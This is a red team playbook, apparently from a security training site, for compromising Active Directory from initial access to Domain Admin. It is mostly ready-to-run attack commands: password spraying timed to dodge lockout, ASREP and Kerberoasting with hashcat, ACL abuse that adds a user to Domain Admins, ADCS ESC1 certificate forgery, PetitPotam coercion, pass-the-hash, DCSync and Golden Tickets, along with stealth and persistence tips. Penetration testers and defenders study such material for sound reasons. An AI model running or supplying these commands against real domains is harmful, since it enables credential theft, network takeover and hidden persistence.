---
title: "Active Directory Attack Methodology: Initial Access to Domain Admin"
description: "A complete red team playbook for Active Directory environments - from initial foothold through lateral movement, privilege escalation, and domain dominance with practical tool usage."
date: 2026-03-23
difficulty: Hard
tags: [active-directory, methodology, lateral-movement, bloodhound, cobalt-strike]
---

## Phase 0: Reconnaissance

Before touching the network, gather external intelligence.

### Passive Recon
- LinkedIn employees → naming convention (first.last, f.last)
- GitHub repos → hardcoded creds, internal hostnames, API keys
- Shodan/Censys → exposed services (RDP, SMB, OWA, ADFS)
- DNS records → MX, SPF, autodiscover → mail infrastructure
- Certificate transparency logs → internal subdomain names

### Username Enumeration
Use the naming convention against the target's mail server or ADFS endpoint:

```bash
# Enumerate valid usernames via SMTP VRFY/RCPT
smtp-user-enum -M RCPT -U users.txt -t mail.corp.com

# Or via Kerberos pre-auth (no lockout)
kerbrute userenum --dc dc01.corp.local -d corp.local users.txt
```

## Phase 1: Initial Access

### Password Spraying

The most reliable initial access against AD environments. One password against many users - stays below lockout thresholds:

```bash
# Spray one password at a time, respect lockout policy
crackmapexec smb dc01.corp.local -u users.txt -p 'Spring2026!' --no-bruteforce
```

**Spray candidates**: Season+Year (Spring2026), Company+Year (Corp2026!), Welcome+Number (Welcome1!), Month+Year (March2026!).

**Timing**: If lockout is 5 attempts / 30 minutes, spray once every 35 minutes.

### ASREPRoasting

Users with "Do not require Kerberos pre-authentication" can be attacked without credentials:

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

## Phase 2: Enumeration

You have one credential. Now map the entire AD environment.

### BloodHound Collection

```bash
# From Linux
bloodhound-python -d corp.local -u jsmith -p 'Spring2026!' -ns 10.0.0.1 -c all

# From Windows (SharpHound)
SharpHound.exe --CollectionMethods All --Domain corp.local
```

### Key BloodHound Queries

```cypher
# Find shortest path to Domain Admin
MATCH p=shortestPath((n:User {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p

# Find Kerberoastable users with paths to DA
MATCH (u:User {hasspn:true})-[r:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

### Critical Enumerations

```bash
# Find all SPNs (Kerberoastable accounts)
impacket-GetUserSPNs corp.local/jsmith:'Spring2026!' -request

# Enumerate shares
crackmapexec smb targets.txt -u jsmith -p 'Spring2026!' --shares

# Find LAPS passwords (if readable)
crackmapexec ldap dc01 -u jsmith -p 'Spring2026!' -M laps

# Check for ADCS
crackmapexec ldap dc01 -u jsmith -p 'Spring2026!' -M adcs
```

## Phase 3: Privilege Escalation

### Path A: Kerberoasting → Crack → DA Path

```bash
# Get TGS tickets
impacket-GetUserSPNs corp.local/jsmith:'Spring2026!' -request -outputfile tgs.txt
# Crack offline
hashcat -m 13100 tgs.txt wordlist.txt -r rules/dive.rule
```

### Path B: ACL Abuse

BloodHound reveals GenericWrite, GenericAll, WriteDacl, ForceChangePassword edges:

```powershell
# GenericAll on user → reset password
Set-ADAccountPassword -Identity target_admin -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)

# WriteDacl on group → add yourself
Add-ADGroupMember -Identity "Domain Admins" -Members jsmith

# GenericWrite on computer → RBCD attack
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$
```

### Path C: ADCS Exploitation

If Certificate Services exist, check for ESC1-ESC8 misconfigurations:

```bash
# Enumerate vulnerable templates
certipy find -u jsmith@corp.local -p 'Spring2026!' -dc-ip 10.0.0.1

# ESC1: Request cert as Domain Admin
certipy req -u jsmith@corp.local -p 'Spring2026!' -target ca.corp.local -template VulnTemplate -ca CORP-CA -upn administrator@corp.local

# Authenticate with the cert
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### Path D: Delegation Abuse

```bash
# Unconstrained delegation: monitor for TGTs
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Coerce DC authentication
PetitPotam.py listener_ip dc01.corp.local

# Use captured TGT for DCSync
export KRB5CCNAME=DC01$.ccache
impacket-secretsdump corp.local/DC01\$@dc01 -k -no-pass
```

## Phase 4: Lateral Movement

### Pass-the-Hash

```bash
crackmapexec smb targets.txt -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash --local-auth
```

### Overpass-the-Hash (Pass-the-Key)

```powershell
Rubeus.exe asktgt /user:admin /rc4:hash /ptt
```

### WMI Execution (OPSEC-friendly)

```bash
impacket-wmiexec corp.local/admin@target -hashes :hash
```

### PSExec Alternatives

PSExec creates a service (Event 7045) - very noisy. Prefer:
- **WMI** - Less logging, no service creation
- **DCOM** - Uses COM objects, minimal artifacts
- **WinRM** - If enabled, looks like admin activity
- **Scheduled Tasks** - `schtasks /create` for delayed execution

## Phase 5: Domain Dominance

### DCSync

Extract all domain hashes:

```bash
impacket-secretsdump corp.local/admin:'P@ss'@dc01 -just-dc
```

### Golden Ticket

```bash
# Need: krbtgt NTLM hash, domain SID
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
```

### Persistence Options

| Technique | Stealth | Survives Password Reset | Detection |
|-----------|---------|:---:|---|
| Golden Ticket | High | All except krbtgt | Event 4769 anomalies |
| Silver Ticket | High | Service account only | Event 4624 type 3 |
| Diamond Ticket | Very High | All except krbtgt | Harder - modifies legit TGT |
| Skeleton Key | Medium | N/A - patches LSASS | Memory forensics |
| DCShadow | Very High | N/A - creates fake DC | Replication monitoring |
| AdminSDHolder | Medium | N/A - ACL persistence | AdminSDHolder auditing |

## Reporting Essentials

Every finding needs: executive summary, attack narrative with timestamps, evidence screenshots, MITRE ATT&CK mapping, CVSS scores, and remediation recommendations.

> The best red team operators aren't the ones who pop Domain Admin fastest - they're the ones who document the complete attack chain clearly enough that the blue team can fix every weakness.
